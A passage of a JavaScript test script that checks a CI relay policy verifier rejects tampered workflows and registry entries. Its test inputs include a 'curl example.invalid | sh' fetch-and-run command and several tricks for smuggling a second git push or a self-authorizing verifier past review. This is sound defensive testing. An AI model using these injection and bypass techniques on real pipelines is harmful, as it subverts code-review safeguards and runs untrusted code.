      '        run: node trusted/scripts/verify-policy.mjs --candidate-root "$CANDIDATE_ROOT" --base-root trusted\n' +
        '        run: node trusted/scripts/test-policy.mjs --base-root trusted',
    );
  }, /Duplicate YAML key run in .* job policy step/u);

  expectRejected('bare sequence marker duplicate step key', (root) => {
    replace(
      root,
      '.github/workflows/relay-policy.yml',
      '        run: node trusted/scripts/verify-policy.mjs --candidate-root "$CANDIDATE_ROOT" --base-root trusted',
      '      -\n' +
        '        run: node trusted/scripts/verify-policy.mjs --candidate-root "$CANDIDATE_ROOT" --base-root trusted\n' +
        '        run: node trusted/scripts/test-policy.mjs --base-root trusted',
    );
  }, /Bare YAML sequence entries are not allowed/u);

  expectRejected('backslash-continued second Git push', (root) => {
    replaceInJob(
      root,
      'receipt',
      '          git -C ledger push origin HEAD:receipts',
      '          git -C ledger push origin HEAD:receipts\n' +
        '          git --no-pager -C ledger \\\n' +
        '            push origin HEAD:refs/heads/main',
    );
  }, /receipt push must be the only Git push command/u);

  expectRejected('midword hash cannot hide a second Git push', (root) => {
    replaceInJob(
      root,
      'receipt',
      '          git -C ledger push origin HEAD:receipts',
      '          git -C ledger push origin HEAD:receipts#x && ' +
        'git -C ledger push origin HEAD:main',
    );
  }, /receipt push must be the only Git push command/u);

  for (const [label, command] of [
    ['Unicode nonbreaking-space hash', ': word\u00a0# && git -C ledger push origin HEAD:main'],
    ['quoted command-name concatenation', "g'it' -C ledger push origin HEAD:main"],
  ]) {
    expectSelfRejected(`complete receipt seal rejects ${label}`, (root) => {
      replaceInJob(root, 'receipt',
        '          git -C ledger push origin HEAD:receipts',
        '          git -C ledger push origin HEAD:receipts\n' +
          `          ${command}`);
    }, /complete write-enabled receipt job changed/u);
  }

  expectSelfRejected('receipt identity validation cannot be removed', (root) => {
    replaceInJob(root, 'receipt',
      "            throw new Error('Receipt workflow identity is missing or inconsistent');",
      "            console.log('pretend-identity-is-valid');");
  }, /complete write-enabled receipt job changed/u);

  expectRejected('folded run scalar hides a second Git push', (root) => {
    replaceInJob(
      root,
      'receipt',
      '      - name: Commit the durable receipt\n' +
        '        shell: bash\n' +
        '        env:\n' +
        '          RECEIPT_FILE: ${{ steps.canonical.outputs.receipt_file }}\n' +
        '        run: |',
      '      - name: Commit the durable receipt\n' +
        '        shell: bash\n' +
        '        env:\n' +
        '          RECEIPT_FILE: ${{ steps.canonical.outputs.receipt_file }}\n' +
        '        run: >2-',
    );
  }, /Folded YAML run scalars are not allowed/u);

  expectRejected('decoy receipts ref outside ledger checkout', (root) => {
    replaceInJob(
      root,
      'prepare_regression',
      '          ref: ${{ github.sha }}',
      '          ref: receipts',
    );
    replaceInJob(
      root,
      'receipt',
      '          ref: receipts\n          path: ledger',
      '          ref: main\n          path: ledger',
    );
  }, /receipts ref must be bound to the isolated ledger checkout/u);

  expectRejected('duplicate receipt job env key', (root) => {
    replaceInJob(
      root,
      'receipt',
      '    env:\n',
      '    env:\n' +
        '      DUPLICATE_SENTINEL: first\n' +
        '    env:\n',
    );
  }, /Duplicate YAML key env in .* job receipt/u);

  expectRejected('Python receipt drops trust-root regressions', (root) => {
    replaceInJob(
      root,
      'receipt',
      "            allPassed = process.env.PYTHON_DISPATCH_RESULT === 'success' &&\n" +
        '              regressionsPassed;',
      "            allPassed = process.env.PYTHON_DISPATCH_RESULT === 'success';",
    );
  }, /Python receipt aggregation must include trust-root regressions/u);

  expectRejected('receipt drops exact target runtime', (root) => {
    replaceInJob(
      root,
      'receipt',
      '              runtime\n',
      '              runtime: null\n',
    );
  }, /Missing trust-boundary command: runtime|receipt.*runtime|runtime.*receipt/iu);

  expectRejected('receipt drops exact regression matrix', (root) => {
    replaceInJob(
      root,
      'receipt',
      '              exact_regression_matrix: regressionMatrix',
      '              exact_regression_matrix: null',
    );
  }, /Missing trust-boundary command: exact_regression_matrix|receipt.*regression|regression.*receipt/iu);

  expectRejected('receipt drops defining workflow SHA', (root) => {
    replaceInJob(
      root,
      'receipt',
      '          DEFINING_WORKFLOW_SHA: ${{ job.workflow_sha }}',
      '          DEFINING_WORKFLOW_SHA: omitted',
    );
  }, /Missing trust-boundary command: DEFINING_WORKFLOW_SHA/u);

  expectRejected('Python dispatch matrix cannot become static', (root) => {
    replaceInJob(
      root,
      'python_dispatch',
      '        python-version: ${{ fromJSON(needs.authorize.outputs.python_versions) }}',
      '        python-version: ["3.11.16", "3.12.14"]',
    );
  }, /python_dispatch.*(?:runtime|matrix)|(?:runtime|matrix).*python_dispatch|python_versions/iu);

  expectRejected('prepare regression target-record cap anchor', (root) => {
    replaceInJob(
      root,
      'prepare_regression',
      '          const MAX_TARGET_RECORDS = 64;',
      '          const MAX_TARGET_RECORDS = 65;',
    );
  }, /prepare_regression registry accounting anchors changed/u);

  expectRejected('prepare regression case-insensitive identity anchor', (root) => {
    replaceInJob(
      root,
      'prepare_regression',
      '            const normalizedRepository = repository.toLowerCase();',
      '            const normalizedRepository = repository;',
    );
  }, /prepare_regression registry accounting anchors changed/u);

  expectRejected('prepare regression positive repository-ID anchor', (root) => {
    replaceInJob(
      root,
      'prepare_regression',
      "            if (!/^[1-9][0-9]*$/.test(stableRepositoryId)) {",
      "            if (!/^[0-9]+$/.test(stableRepositoryId)) {",
    );
  }, /prepare_regression registry accounting anchors changed/u);

  expectRejected('prepare regression repository-ID uniqueness anchor', (root) => {
    replaceInJob(
      root,
      'prepare_regression',
      '            if (stableRepositoryIds.has(stableRepositoryId)) {',
      '            if (false) {',
    );
  }, /prepare_regression registry accounting anchors changed/u);

  expectRejected('prepare regression expanded-job cap anchor', (root) => {
    replaceInJob(
      root,
      'prepare_regression',
      '          const MAX_REGRESSION_JOBS = 32;',
      '          const MAX_REGRESSION_JOBS = 33;',
    );
  }, /prepare_regression registry accounting anchors changed/u);

  expectRejected('prepare regression cannot truthiness-skip malformed candidates', (root) => {
    replaceInJob(
      root,
      'prepare_regression',
      "            if (!Object.hasOwn(entry ?? {}, 'regression_candidate')) continue;",
      '            if (!candidate) continue;',
    );
  }, /prepare_regression registry accounting anchors changed/u);

  expectRejected('prepare regression cannot truncate target records before cap', (root) => {
    replaceInJob(
      root,
      'prepare_regression',
      '          const targetRecords = Object.entries(config.targets ?? {});\n',
      '          const targetRecords = Object.entries(config.targets ?? {});\n' +
        '          targetRecords.length = Math.min(targetRecords.length, MAX_TARGET_RECORDS);\n',
    );
  }, /prepare_regression registry accounting anchors changed/u);

  expectRejected('prepare regression cannot reset accounting sets', (root) => {
    replaceInJob(
      root,
      'prepare_regression',
      '          for (const [repository, entry] of targetRecords) {\n',
      '          for (const [repository, entry] of targetRecords) {\n' +
        '            targetNames.clear();\n' +
        '            stableRepositoryIds.clear();\n',
    );
  }, /prepare_regression registry accounting anchors changed/u);

  expectRejected('prepare regression cannot truncate expanded jobs before cap', (root) => {
    replaceInJob(
      root,
      'prepare_regression',
      "                node_version: runtime.node_version ?? ''\n" +
        '              });\n' +
        '              if (include.length > MAX_REGRESSION_JOBS) {',
      "                node_version: runtime.node_version ?? ''\n" +
        '              });\n' +
        '              include.length = Math.min(include.length, MAX_REGRESSION_JOBS);\n' +
        '              if (include.length > MAX_REGRESSION_JOBS) {',
    );
  }, /prepare_regression registry accounting anchors changed/u);

  expectRejected('Python regression canonical live identity anchor', (root) => {
    replaceInJob(
      root,
      'python_regression',
      '              String(live.full_name).toLowerCase() !== process.env.TARGET_REPO.toLowerCase() ||',
      '              false ||',
    );
  }, /python_regression canonical live repository identity anchor changed/u);

  expectRejected('Python regression live identity remains authenticated', (root) => {
    replaceInJob(
      root,
      'python_regression',
      '              --header "Authorization: Bearer $GITHUB_TOKEN" \\\n',
      '',
    );
  }, /python_regression canonical live repository identity anchor changed/u);

  expectRejected('Python regression cannot overwrite live canonical identity', (root) => {
    replaceInJob(
      root,
      'python_regression',
      '          const entry = config.targets?.[process.env.TARGET_REPO];\n',
      '          const entry = config.targets?.[process.env.TARGET_REPO];\n' +
        '          live.full_name = process.env.TARGET_REPO;\n',
    );
  }, /python_regression canonical live repository identity anchor changed/u);

  for (const jobId of ['posix', 'python_dispatch', 'python_regression']) {
    expectRejected(`${jobId} floating fetch revision`, (root) => {
      replaceInJob(
        root,
        jobId,
        'fetch --no-tags --depth=1 origin "$revision"',
        'fetch --no-tags --depth=1 origin main',
      );
    }, new RegExp(`Execution job ${jobId} must fetch only the authorized exact revision`, 'u'));

    expectRejected(`${jobId} missing revision verification`, (root) => {
      replaceInJob(
        root,
        jobId,
        '[[ "$(git -C "$directory" rev-parse HEAD)" == "$revision" ]]',
        'true # exact revision verification removed',
      );
    }, new RegExp(`Execution job ${jobId} must verify both fetched exact revisions`, 'u'));
  }

  expectRejected('windows floating fetch revision', (root) => {
    replaceInJob(
      root,
      'windows',
      'fetch --no-tags --depth=1 origin $source.Revision',
      'fetch --no-tags --depth=1 origin main',
    );
  }, /Execution job windows must fetch only the authorized exact revision/u);

  expectRejected('windows missing revision verification', (root) => {
    replaceInJob(
      root,
      'windows',
      '$actual = git -C $source.Directory rev-parse HEAD',
      '$actual = $source.Revision # exact revision verification removed',
    );
  }, /Execution job windows must verify the fetched Windows revision/u);

  expectRejected('candidate verifier cannot self-authorize', (root) => {
    fs.writeFileSync(
      path.join(root, 'scripts', 'verify-policy.mjs'),
      'process.exit(0);\n',
    );
  }, /Frozen executable trust root changed: scripts\/verify-policy\.mjs/u);

  expectRejected('candidate regression tests cannot self-authorize', (root) => {
    fs.writeFileSync(
      path.join(root, 'scripts', 'test-policy.mjs'),
      'console.log("candidate bypass");\n',
    );
  }, /Frozen executable trust root changed: scripts\/test-policy\.mjs/u);

  for (const workflowFile of [
    'relay-policy.yml',
    'relay-process-environment.yml',
  ]) {
    expectRejected(`candidate cannot edit frozen workflow ${workflowFile}`, (root) => {
      fs.appendFileSync(
        path.join(root, '.github', 'workflows', workflowFile),
        '\n# candidate-only workflow edit\n',
      );
    }, new RegExp(
      `Frozen executable trust root changed: \\.github/workflows/${workflowFile.replace('.', '\\.')} `
        .trim(),
      'u',
    ));
  }

  expectRejected('candidate cannot edit a trusted profile', (root) => {
    fs.appendFileSync(
      path.join(root, 'profiles', 'python-ruff-pytest-v1.sh'),
      '\n: # candidate-only profile edit\n',
    );
  }, /(?:Reviewed profile digest changed|Frozen executable trust root changed): profiles\/python-ruff-pytest-v1\.sh/u);

  expectRejected('candidate cannot edit the relay launcher', (root) => {
    fs.appendFileSync(path.join(root, 'relay'), '\n# candidate-only launcher edit\n');
  }, /Frozen executable trust root changed: relay/u);

  expectRejected('candidate cannot add a trusted profile', (root) => {
    fs.writeFileSync(path.join(root, 'profiles', 'untrusted.sh'), '#!/usr/bin/env bash\n');
  }, /Reviewed profile digest allowlist is incomplete|Frozen executable trust root changed: profiles/u);

  expectRejected('candidate cannot add trust-root Git attributes', (root) => {
    fs.writeFileSync(path.join(root, '.gitattributes'), 'scripts/** filter=lfs\n');
  }, /Git attributes governing the trust root changed: \.gitattributes/u);

  expectRejected('symlink in executable trust root', (root) => {
    fs.unlinkSync(path.join(root, 'relay'));
    fs.symlinkSync('/bin/true', path.join(root, 'relay'));
  }, /Symlinks are not allowed in the executable trust root: relay/u);

  expectRejected('oversized executable trust-root file', (root) => {
    fs.writeFileSync(
      path.join(root, 'scripts', 'test-policy.mjs'),
      Buffer.alloc(2 * 1024 * 1024 + 1, 0x20),
    );
  }, /Executable trust-root file is oversized: scripts\/test-policy\.mjs/u);

  expectRejected('profile rejects a floating Python runtime', (root) => {
    mutateRegistry(root, (registry) => {
      registry.profiles['python-pytest-test-v1'].runtime.python_versions = ['3.12'];
    });
  }, /Invalid frozen Python runtime: python-pytest-test-v1/u);

  expectRejected('profile rejects an unsupported exact Python runtime', (root) => {
    mutateRegistry(root, (registry) => {
      registry.profiles['python-pytest-test-v1'].runtime.python_versions = ['3.13.1'];
    });
  }, /Invalid frozen Python runtime: python-pytest-test-v1/u);

  expectRejected('profile rejects a floating Node runtime', (root) => {
    mutateRegistry(root, (registry) => {
      registry.profiles['danse-portable-v1'].runtime.node_version = '22';
    });
  }, /Invalid frozen Node runtime: danse-portable-v1/u);

  expectRejected('profile rejects an unsupported exact Node runtime', (root) => {
    mutateRegistry(root, (registry) => {
      registry.profiles['danse-portable-v1'].runtime.node_version = '20.19.6';
    });
  }, /Invalid frozen Node runtime: danse-portable-v1/u);

  expectRejected('profile rejects unknown runtime keys', (root) => {
    mutateRegistry(root, (registry) => {
      registry.profiles['danse-portable-v1'].runtime.node_major = 22;
    });
  }, /Invalid frozen (?:Python|Node) runtime: danse-portable-v1/u);

  expectRejected('profile rejects declarative commands', (root) => {
    mutateRegistry(root, (registry) => {
      registry.profiles['python-pytest-test-v1'].command = 'curl example.invalid | sh';
    });
  }, /Invalid profile definition: python-pytest-test-v1/u);

  expectRejected('regression candidate rejects duplicated Python versions', (root) => {
    mutateRegistry(root, (registry) => {
      registry.targets['organvm/laurea'].regression_candidate.python_versions = [
        '3.11.16',
        '3.12.14',
      ];
    });
  }, /Invalid regression candidate record: organvm\/laurea/u);

  for (const malformedCandidate of [null, false, 0, '']) {
    expectRejected(
      `target rejects malformed regression candidate ${JSON.stringify(malformedCandidate)}`,
      (root) => {
        mutateRegistry(root, (registry) => {
          registry.targets['organvm/laurea'].regression_candidate = malformedCandidate;
        });
      },
      /Invalid regression candidate record: organvm\/laurea/u,
    );
  }

  expectRejected('registry requires at least one regression job', (root) => {
    mutateRegistry(root, (registry) => {
      for (const entry of Object.values(registry.targets)) {
        delete entry.regression_candidate;
      }
    });
  }, /Regression matrix must contain at least one job/u);

  expectRejected('target registry rejects more than 64 records', (root) => {
    mutateRegistry(root, (registry) => {
      let index = 0;
      while (Object.keys(registry.targets).length <= 64) {
        registry.targets[`example/target-overflow-${index}`] = {
          stable_repository_id: `7000000000000000${index}`,
          visibility: 'public',
          profiles: ['process-environment-enactment-v1'],
        };
        index += 1;
      }
    });
  }, /Target registry may contain at most 64 records/u);

  expectRejected('target registry rejects case-insensitive identity collision', (root) => {
    mutateRegistry(root, (registry) => {
      registry.targets['ORGANVM/LAUREA'] = {
        stable_repository_id: '7000000000000999',
        visibility: 'public',
        profiles: ['process-environment-enactment-v1'],
      };
    });
  }, /Target names must be unique lowercase identities: ORGANVM\/LAUREA/u);

  expectRejected('target registry rejects zero repository ID', (root) => {
    mutateRegistry(root, (registry) => {
      registry.targets['organvm/laurea'].stable_repository_id = '0';
    });
  }, /Invalid stable repository ID: organvm\/laurea/u);

  expectRejected('target registry rejects duplicate repository ID', (root) => {
    mutateRegistry(root, (registry) => {
      registry.targets['example/repository-id-collision'] = {
        stable_repository_id:
          registry.targets['organvm/laurea'].stable_repository_id,
        visibility: 'public',
        profiles: ['process-environment-enactment-v1'],
      };
    });
  }, /Duplicate stable repository ID/u);

  expectRejected('regression matrix rejects more than 32 expanded jobs', (root) => {
    mutateRegistry(root, (registry) => {
      const profile = 'python-ruff-pytest-v1';
      let expandedJobs = Object.values(registry.targets).reduce(
        (count, entry) => count + (entry.regression_candidate
          ? registry.profiles[entry.regression_candidate.profile]
            .runtime.python_versions.length
          : 0),
        0,
      );
      let index = 0;
      while (expandedJobs <= 32) {
        registry.targets[`example/regression-overflow-${index}`] = {
          stable_repository_id: `8000000000000000${index}`,
          visibility: 'public',
          profiles: [profile],
          regression_candidate: {
            profile,
            sha: 'a'.repeat(40),
          },
        };
        expandedJobs += registry.profiles[profile].runtime.python_versions.length;
        index += 1;
      }
    });
  }, /Regression matrix may contain at most 32 jobs/u);

  expectRejected('candidate cannot extend frozen registry policy', (root) => {
    mutateRegistry(root, (registry) => {
      registry.policy.candidate_override = true;
    });
  }, /Candidate may change only target records and canary fields; schema, policy, and profiles are frozen/u);

  expectRejected('candidate cannot change a frozen profile description', (root) => {
    mutateRegistry(root, (registry) => {
      registry.profiles['python-ruff-pytest-v1'].description += ' candidate edit';
    });
  }, /Candidate may change only target records and canary fields; schema, policy, and profiles are frozen/u);

  expectRejected('candidate cannot change a valid frozen profile runtime', (root) => {
    mutateRegistry(root, (registry) => {
      registry.profiles['python-ruff-pytest-v1'].runtime.python_versions.reverse();
    });
  }, /Candidate may change only target records and canary fields; schema, policy, and profiles are frozen/u);

  expectRejected('canary rejects uppercase SHA', (root) => {
    mutateRegistry(root, (registry) => {
      registry.canary.sha = 'A'.repeat(40);
    });
  }, /Relay canary contains an invalid target, SHA, profile, or provenance label/u);

  expectRejected('canary rejects disallowed target profile', (root) => {
    mutateRegistry(root, (registry) => {
      registry.canary.profile = 'python-ruff-pytest-v1';
    });
  }, /Relay canary is not an allowlisted public target\/profile pair/u);

  expectAccepted('dynamic target registration', (root) => {
    mutateRegistry(root, (registry) => {
      registry.targets['example/public-project'] = {
        stable_repository_id: '123456789',
        visibility: 'public',
        profiles: ['process-environment-enactment-v1'],
      };
    });
  });

  expectAccepted('dynamic regression candidate SHA', (root) => {
    mutateRegistry(root, (registry) => {
      registry.targets['organvm/learning-resources'].regression_candidate.sha =
        '1'.repeat(40);
    });
  });

  expectAccepted('dynamic push-canary SHA', (root) => {
    mutateRegistry(root, (registry) => {
      registry.canary.sha = '2'.repeat(40);
    });
  });

  expectAccepted('dynamic push-canary target and profile', (root) => {
    mutateRegistry(root, (registry) => {
      registry.canary.target = 'organvm/learning-resources';
      registry.canary.sha =
        registry.targets['organvm/learning-resources'].regression_candidate.sha;
      registry.canary.profile = 'python-ruff-pytest-v1';
      registry.canary.lead_provider = 'relay-python-canary';
    });
  });

  console.log(
    `verified ${regressionCount} fail-closed relay policy regressions and ` +
      `${acceptanceCount} dynamic policy acceptance cases; ` +
      `${receiptRuntimeCount} embedded receipt runtime cases`,
  );
} finally {
  for (const root of fixtureRoots) {
    fs.rmSync(root, { recursive: true, force: true });
  }
}
